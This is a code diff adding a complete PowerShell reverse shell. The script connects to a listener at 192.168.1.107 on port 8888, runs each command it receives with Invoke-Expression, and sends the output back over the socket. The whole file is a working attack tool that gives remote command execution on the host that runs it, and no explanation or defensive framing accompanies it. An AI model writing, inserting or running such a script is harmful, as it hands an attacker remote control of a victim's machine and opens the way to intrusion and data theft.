@@ -1,0 +1,35 @@
+$LHOST = "192.168.1.107"
+$LPORT = 8888
+$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
+$NetworkStream = $TCPClient.GetStream()
+$StreamReader = New-Object IO.StreamReader($NetworkStream)
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+$StreamWriter.AutoFlush = $true
+$Buffer = New-Object System.Byte[] 1024
+
+$StreamWriter.Write("[*] Connected to $LHOST`n")
+
+try {
+    while ($TCPClient.Connected) {
+        if ($NetworkStream.DataAvailable) {
+            $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
+            if ($RawData -gt 0) {
+                $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData).Trim()
+                $StreamWriter.Write("[PS] C:\> $Command`n")
+                try {
+                    $Output = Invoke-Expression $Command 2>&1 | Out-String
+                    $StreamWriter.Write("$Output`n")
+                } catch {
+                    $StreamWriter.Write("Error: $_`n")
+                }
+            }
+        }
+        Start-Sleep -Milliseconds 100
+    }
+} finally {
+    $StreamWriter.Write("[*] Disconnected`n")
+    $StreamReader.Close()
+    $StreamWriter.Close()
+    $NetworkStream.Close()
+    $TCPClient.Close()
+}
